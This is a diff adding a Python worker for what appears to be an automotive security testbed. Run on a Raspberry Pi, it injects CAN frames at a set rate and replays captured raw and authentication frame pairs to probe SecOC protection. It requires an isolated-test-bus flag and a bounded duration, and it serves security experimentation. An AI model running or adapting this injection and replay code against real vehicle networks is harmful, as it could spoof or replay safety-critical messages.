@@ -1,0 +1,132 @@
+"""Keyless CAN-only worker on Pi3, controlled over PC-owned SSH stdin.
+
+No SSH clients, SecOC key input, authentication or reference receiver are used.
+Replay copies a raw/auth pair observed on this bus without verifying its MAC.
+"""
+import argparse
+import errno
+import json
+import os
+import random
+import select
+import signal
+import time
+
+from security.attacks.attack_simulator import build_frame, validate
+from security.experiments.can_capture import CaptureSocket, frame_json
+from security.experiments.trial_observer import healthy
+
+
+class Control:
+    def __init__(self, fd=0):
+        self.fd, self.pending = fd, b''
+
+    def poll(self):
+        if select.select([self.fd], [], [], 0)[0]:
+            data = os.read(self.fd, 4096)
+            if not data:raise EOFError('controller disconnected')
+            self.pending += data
+            if len(self.pending)>8192:raise ValueError('command too long')
+        if b'\n' not in self.pending:return None
+        line, self.pending = self.pending.split(b'\n', 1)
+        return json.loads(line)
+
+
+def emit(row):
+    print(json.dumps(row), flush=True)
+
+
+def replay_pair(records, require_auth):
+    raw = None
+    for frame in records:
+        if frame.can_id == 0x100:raw = frame
+        elif require_auth and frame.can_id == 0x102 and raw is not None and 0 <= frame.t-raw.t <= .1:
+            return [(raw.can_id, raw.data), (frame.can_id, frame.data)]
+    if not require_auth and raw is not None:return [(raw.can_id, raw.data)]
+    raise RuntimeError('no observed replay pair in quiet baseline')
+
+
+def inject(bus, request, control, deadline, acknowledged):
+    attack, rate, duration = request['attack'], float(request['rate']), float(request['duration'])
+    error = validate(attack, request['interface'], rate, duration, acknowledged)
+    if error:raise ValueError(error)
+    trial = request['trial']
+    rng = random.Random(request['seed'])
+    captured = []
+    if attack == 'replay':
+        until = min(deadline, time.monotonic()+1)
+        while time.monotonic()<until:
+            if control.poll() is not None:raise ValueError('unexpected command during replay capture')
+            value=bus.receive(.01)
+            if value:
+                frame, own=value
+                if frame.error:raise RuntimeError('CAN error frame')
+                if not own:captured.append(frame)
+        pair=replay_pair(captured, request['secoc'])
+        emit({'result':'REPLAY_SOURCE','trial':trial,'frames':[
+            {'can_id':cid,'data':data.hex()} for cid,data in pair], 'authenticated':False})
+    else:pair=None
+    sent=errors=echoes=0
+    end=min(deadline,time.monotonic()+duration)
+    next_at=time.monotonic()
+    while time.monotonic()<end:
+        if control.poll() is not None:raise ValueError('unexpected command during injection')
+        now=time.monotonic()
+        if now>=next_at:
+            cid,data=pair[sent%len(pair)] if pair else build_frame(attack,rng,sent)
+            try:
+                bus.send(cid,data)
+                sent+=1
+                emit({'result':'TX','trial':trial,'t':time.monotonic(),'can_id':cid,'data':data.hex()})
+            except OSError as error:
+                emit({'result':'TX_ERROR','trial':trial,'errno':error.errno})
+                if error.errno not in (errno.ENOBUFS,errno.EAGAIN):raise
+                errors+=1
+            next_at=max(next_at+1/rate,now)
+        value=bus.receive(min(.001,max(0,next_at-time.monotonic())))
+        if value:
+            frame,own=value
+            if frame.error:raise RuntimeError('CAN error frame')
+            echoes+=int(own)
+            emit({'result':'ATTACK_RX','trial':trial,'own':own,**frame_json(frame)})
+    emit({'result':'ATTACK_DONE','trial':trial,'sent':sent,'tx_errors':errors,'own_echo':echoes,
+          'rx_dropped':bus.dropped})
+
+
+def run(channel, duration, run_id, acknowledged, control=None):
+    healthy(channel)
+    bus=CaptureSocket(channel,transmit=True)
+    control=control or Control()
+    deadline=time.monotonic()+duration
+    def stop(*_):raise EOFError('worker stopped')
+    old={s:signal.signal(s,stop) for s in (signal.SIGTERM,signal.SIGINT,signal.SIGHUP)}
+    try:
+        emit({'result':'READY','run_id':run_id,'role':'keyless-can-attacker'})
+        while time.monotonic()<deadline:
+            request=control.poll()
+            if request is not None:
+                if request.get('interface')!=channel:raise ValueError('interface mismatch')
+                inject(bus,request,control,deadline,acknowledged)
+            else:
+                value=bus.receive(.01)
+                if value and value[0].error:raise RuntimeError('CAN error frame')
+    except EOFError:
+        pass
+    finally:
+        bus.close()
+        for s,handler in old.items():signal.signal(s,handler)
+        emit({'result':'ATTACKER_STOPPED','run_id':run_id})
+
+
+def main(argv=None):
+    parser=argparse.ArgumentParser(description=__doc__)
+    parser.add_argument('--interface',default='can0')
+    parser.add_argument('--duration',type=float,required=True)
+    parser.add_argument('--run-id',required=True)
+    parser.add_argument('--i-am-on-a-test-bus',action='store_true')
+    args=parser.parse_args(argv)
+    if not 0<args.duration<=86400 or not args.i_am_on_a_test_bus:parser.error('bounded duration and isolated bus confirmation required')
+    run(args.interface,args.duration,args.run_id,args.i_am_on_a_test_bus)
+
+
+if __name__=='__main__':main()
